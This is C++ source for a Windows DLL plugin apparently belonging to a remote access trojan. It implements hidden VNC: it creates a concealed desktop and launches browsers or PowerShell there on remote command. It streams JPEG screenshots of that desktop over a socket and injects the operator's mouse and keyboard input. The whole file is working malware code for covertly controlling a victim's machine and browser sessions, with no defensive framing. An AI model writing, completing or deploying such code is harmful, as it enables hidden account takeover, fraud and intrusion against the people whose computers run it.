#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct HiddenVNCFrameHeader {
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HIDDEN_VNC_FRAME = 0x06;
static const uint32_t MONITOR_FRAME_FORMAT_JPEG = 1;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_sendMutex;
static SOCKET g_pluginSocket = INVALID_SOCKET;
static HDESK g_hHiddenDesktop = NULL;
static int g_quality = 50;

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

static bool safe_send_raw(SOCKET sock, const string& data) {
    const char* ptr = data.c_str();
    int remaining = (int)data.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump() + "\r\n";
    return safe_send_raw(sock, serialized);
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) return true;
    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0, size = 0;
    GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok) return -1;
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }
    return -1;
}

static bool bitmap_to_jpeg(HBITMAP hbm, ULONG quality, vector<uint8_t>& bytes) {
    if (!ensure_gdiplus()) return false;
    CLSID jpegClsid;
    if (get_encoder_clsid(L"image/jpeg", &jpegClsid) < 0) return false;
    Bitmap bitmap(hbm, NULL);
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) return false;
    EncoderParameters params;
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;
    if (bitmap.Save(stream, &jpegClsid, &params) != Ok) { stream->Release(); return false; }
    STATSTG stat;
    stream->Stat(&stat, STATFLAG_NONAME);
    bytes.resize((size_t)stat.cbSize.QuadPart);
    LARGE_INTEGER li = {0};
    stream->Seek(li, STREAM_SEEK_SET, NULL);
    ULONG read = 0;
    stream->Read(bytes.data(), (ULONG)bytes.size(), &read);
    stream->Release();
    return true;
}

struct EnumData {
    HDC hdcMem;
};

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (!IsWindowVisible(hwnd)) return TRUE;
    EnumData* data = (EnumData*)lParam;
    RECT rect;
    GetWindowRect(hwnd, &rect);
    PrintWindow(hwnd, data->hdcMem, PW_RENDERFULLCONTENT);
    return TRUE;
}

static void capture_loop() {
    SetThreadDesktop(g_hHiddenDesktop);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    while (g_captureRunning) {
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, width, height);
        HGDIOBJ old = SelectObject(hdcMem, hbm);

        // Fill background
        RECT r = {0, 0, width, height};
        FillRect(hdcMem, &r, (HBRUSH)GetStockObject(BLACK_BRUSH));

        EnumData data = { hdcMem };
        EnumDesktopWindows(g_hHiddenDesktop, EnumWindowsProc, (LPARAM)&data);

        vector<uint8_t> jpegBytes;
        if (bitmap_to_jpeg(hbm, g_quality, jpegBytes)) {
            HiddenVNCFrameHeader fh = {(uint32_t)width, (uint32_t)height, MONITOR_FRAME_FORMAT_JPEG, (uint32_t)jpegBytes.size()};
            PacketHeader ph = {PACKET_SIGNATURE, PACKET_TYPE_HIDDEN_VNC_FRAME, (uint32_t)(sizeof(fh) + jpegBytes.size())};

            vector<uint8_t> packet(sizeof(ph) + sizeof(fh) + jpegBytes.size());
            memcpy(packet.data(), &ph, sizeof(ph));
            memcpy(packet.data() + sizeof(ph), &fh, sizeof(fh));
            memcpy(packet.data() + sizeof(ph) + sizeof(fh), jpegBytes.data(), jpegBytes.size());

            lock_guard<mutex> lock(g_sendMutex);
            safe_send_raw(g_pluginSocket, string((char*)packet.data(), packet.size()));
        }

        SelectObject(hdcMem, old);
        DeleteObject(hbm);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Sleep(100);
    }
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
    try {
        json j = json::parse(cmdJson);
        string action = j.value("action", "");
        g_pluginSocket = sock;

        if (action == "hvnc_start") {
            g_quality = j.value("quality", 50);
            if (!g_hHiddenDesktop) {
                g_hHiddenDesktop = CreateDesktopW(L"HiddenDesk", NULL, NULL, 0, GENERIC_ALL, NULL);
            }
            if (!g_captureRunning) {
                g_captureRunning = true;
                if (g_captureThread.joinable()) g_captureThread.join();
                g_captureThread = thread(capture_loop);
            }
            safe_send_json(sock, {{"action", "hvnc_status"}, {"status", "started"}});
        } else if (action == "hvnc_stop") {
            g_captureRunning = false;
            safe_send_json(sock, {{"action", "hvnc_status"}, {"status", "stopped"}});
        } else if (action == "hvnc_run") {
            string path = j.value("path", "");
            STARTUPINFOW si = {sizeof(si)};
            si.lpDesktop = (LPWSTR)L"HiddenDesk";
            PROCESS_INFORMATION pi = {0};
            wstring wpath(path.begin(), path.end());
            if (path == "Edge") wpath = L"msedge.exe";
            else if (path == "Chrome") wpath = L"chrome.exe";
            else if (path == "PowerShell") wpath = L"powershell.exe";

            if (CreateProcessW(NULL, (LPWSTR)wpath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                safe_send_json(sock, {{"action", "hvnc_status"}, {"status", "process_started"}});
            } else {
                safe_send_json(sock, {{"action", "hvnc_error"}, {"error", "Failed to start process"}});
            }
        } else if (action == "hvnc_mouse") {
            if (!g_hHiddenDesktop) return;
            SetThreadDesktop(g_hHiddenDesktop);

            string event = j.value("event", "");
            int button = stoi(j.value("button", "0"));
            int x = j.value("x", 0); // 0-65535
            int y = j.value("y", 0);

            int sw = GetSystemMetrics(SM_CXSCREEN);
            int sh = GetSystemMetrics(SM_CYSCREEN);
            int real_x = (x * sw) / 65535;
            int real_y = (y * sh) / 65535;

            UINT msg = 0;
            WPARAM wparam = 0;
            if (event == "down") {
                if (button == 0) msg = WM_LBUTTONDOWN;
                else if (button == 1) msg = WM_RBUTTONDOWN;
                wparam = (button == 0) ? MK_LBUTTON : MK_RBUTTON;
            } else if (event == "up") {
                if (button == 0) msg = WM_LBUTTONUP;
                else if (button == 1) msg = WM_RBUTTONUP;
            } else if (event == "move") {
                msg = WM_MOUSEMOVE;
            }

            if (msg != 0) {
                HWND hwnd = WindowFromPoint({real_x, real_y});
                if (hwnd) {
                    POINT pt = {real_x, real_y};
                    ScreenToClient(hwnd, &pt);
                    PostMessage(hwnd, msg, wparam, MAKELPARAM(pt.x, pt.y));
                }
            }
        } else if (action == "hvnc_key") {
            if (!g_hHiddenDesktop) return;
            SetThreadDesktop(g_hHiddenDesktop);

            string event = j.value("event", "");
            int vk = j.value("key", 0);

            UINT msg = (event == "down") ? WM_KEYDOWN : WM_KEYUP;
            HWND hwnd = GetFocus();
            if (!hwnd) hwnd = GetForegroundWindow();
            if (hwnd) {
                PostMessage(hwnd, msg, vk, 0);
            }
        }
    } catch (...) {}
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    g_pluginSocket = sock;
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning = false;
        if (g_captureThread.joinable()) g_captureThread.join();
        if (g_hHiddenDesktop) CloseDesktop(g_hHiddenDesktop);
    }
    return TRUE;
}
